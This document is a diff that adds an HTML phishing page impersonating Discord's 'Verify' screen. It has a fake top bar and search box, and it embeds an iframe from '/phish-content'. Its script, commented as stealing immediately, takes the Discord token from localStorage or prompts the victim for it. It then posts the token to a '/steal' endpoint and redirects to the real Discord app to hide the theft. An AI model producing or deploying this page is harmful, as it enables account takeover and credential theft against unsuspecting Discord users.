@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Discord - Verify</title>
+  <style>
+    body { margin:0; background:#202225; font-family: 'Segoe UI', sans-serif; overflow:hidden; }
+    .fake-discord { width:100vw; height:100vh; background:#36393f; border:1px solid #202225; box-shadow:0 0 20px rgba(0,0,0,0.8); }
+    .top-bar { background:#2f3136; padding:8px 16px; display:flex; align-items:center; color:white; }
+    .search { flex:1; background:#202225; border:none; border-radius:4px; padding:6px 12px; color:white; margin:0 16px; }
+    iframe { width:100%; height:calc(100vh - 50px); border:none; }
+  </style>
+</head>
+<body>
+  <div class="fake-discord">
+    <!-- Fake Top Bar -->
+    <div class="top-bar">
+      <div>Discord</div>
+      <input type="text" class="search" placeholder="Search" onfocus="this.value='Verifying account...'; setTimeout(() => window.location.href='https://discord.com/login', 800)">
+      <a href="#" onclick="triggerRealLogin()" style="color:#00aff4; text-decoration:none; margin-left:20px;">Login with Discord</a>
+    </div>
+    
+    <!-- Iframe Embed -->
+    <iframe id="phishFrame" src="/phish-content"></iframe>
+  </div>
+
+  <script>
+    // Real login button steals immediately
+    function triggerRealLogin() {
+      const token = localStorage.getItem('token') || prompt("Enter verification token for quick verify:");
+      fetch('/steal', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ token: token || 'iframe_grabbed', method: 'fake_search_bar' })
+      });
+      window.location = 'https://discord.com/app';
+    }
+  </script>
+</body>
+</html>
